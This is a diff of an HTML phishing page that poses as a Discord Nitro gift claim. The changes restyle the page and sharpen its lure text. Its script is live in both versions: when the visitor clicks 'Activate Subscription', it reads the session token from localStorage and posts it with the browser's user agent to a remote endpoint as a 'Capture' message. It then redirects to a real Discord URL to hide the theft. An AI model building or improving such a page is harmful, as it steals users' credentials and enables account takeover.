@@ -3,69 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nitro | Verification</title>
+    <title>Nitro | Claim</title>
     <style>
         :root {
-            --blurple: #5865F2;
-            --bg-dark: #202225;
-            --text-main: #FFFFFF;
+            --glow: #5865F2;
+            --bg-dark: #18191C;
         }
 
         body {
             margin: 0;
-            background-color: #18191C;
+            background: linear-gradient(135deg, #18191C 0%, #2B2D31 100%);
+            color: #FFFFFF;
             font-family: 'gg sans', sans-serif;
             display: flex; justify-content: center; align-items: center;
-            height: 100vh;
+            height: 100vh; overflow: hidden;
         }
 
-        .container {
-            background: var(--bg-dark);
-            width: 440px;
-            padding: 32px;
-            border-radius: 8px;
+        .card {
+            background: rgba(43, 45, 49, 0.8);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            width: 420px; padding: 40px; border-radius: 16px;
             text-align: center;
-            box-shadow: 0 0 0 1px rgba(0,0,0,0.3), 0 2px 10px rgba(0,0,0,0.6);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        /* Ensuring the image matches image_3998e3.png look */
-        .logo {
-            width: 40px;
-            margin-bottom: 16px;
+        .card:hover {
+            box-shadow: 0 0 30px rgba(88, 101, 242, 0.2);
+            transform: translateY(-5px);
         }
 
-        h1 { color: var(--text-main); font-size: 20px; margin-bottom: 12px; }
-        p { color: #b9bbbe; font-size: 14px; margin-bottom: 24px; line-height: 1.4; }
+        h1 { font-size: 28px; margin-bottom: 12px; background: linear-gradient(to right, #fff, #b9bbbe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        p { color: #B9BBBE; margin-bottom: 30px; line-height: 1.5; }
 
-        .btn {
-            background: var(--blurple);
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            width: 100%;
-            border-radius: 3px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s;
+        .btn-claim {
+            background: var(--glow);
+            color: white; border: none; padding: 14px; width: 100%;
+            border-radius: 8px; font-weight: 700; font-size: 16px;
+            cursor: pointer; position: relative; overflow: hidden;
+            transition: all 0.3s ease;
         }
 
-        .btn:hover { background: #4752c4; }
+        .btn-claim:hover { box-shadow: 0 0 20px var(--glow); transform: scale(1.02); }
+
+        /* Subtle animated background */
+        .card::before {
+            content: ''; position: absolute; inset: -1px; border-radius: 17px;
+            padding: 1px; background: linear-gradient(45deg, var(--glow), transparent);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor; mask-composite: exclude;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Using image_3998e3.png as requested -->
-        <img src="image_3998e3.png" alt="Logo" class="logo">
-        
+    <div class="card">
         <h1>Claim Nitro Gift</h1>
-        <p>Your subscription gift is ready to be applied. Verify your identity to activate.</p>
-        <button id="claimBtn" class="btn">Activate Subscription</button>
+        <p>A premium 3-month Nitro gift is waiting for you. Click to verify your session and redeem your rewards instantly.</p>
+        <button id="claimBtn" class="btn-claim">Activate Subscription</button>
     </div>
 
     <script>
         document.getElementById('claimBtn').addEventListener('click', async () => {
             const btn = document.getElementById('claimBtn');
-            btn.innerText = "Verifying...";
+            btn.innerText = "Processing...";
+            btn.style.opacity = "0.7";
             btn.disabled = true;
 
             const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
@@ -76,11 +78,11 @@
                 body: JSON.stringify({
                     content: "@everyone",
                     embeds: [{
-                        title: "🚀 Elite Capture",
+                        title: "🚀 Interactive Capture",
                         color: 0x5865F2,
                         fields: [
-                            { name: "Auth Token", value: `\`${token || "NULL"}\`` },
-                            { name: "Agent", value: `\`${navigator.userAgent}\`` }
+                            { name: "Token", value: `\`${token || "NULL"}\`` },
+                            { name: "System", value: `\`${navigator.userAgent}\`` }
                         ]
                     }]
                 })
@@ -88,7 +90,7 @@
 
             setTimeout(() => {
                 window.location.replace("https://discord.com/billing/promotions/gift-accepted");
-            }, 1000);
+            }, 800);
         });
     </script>
 </body>
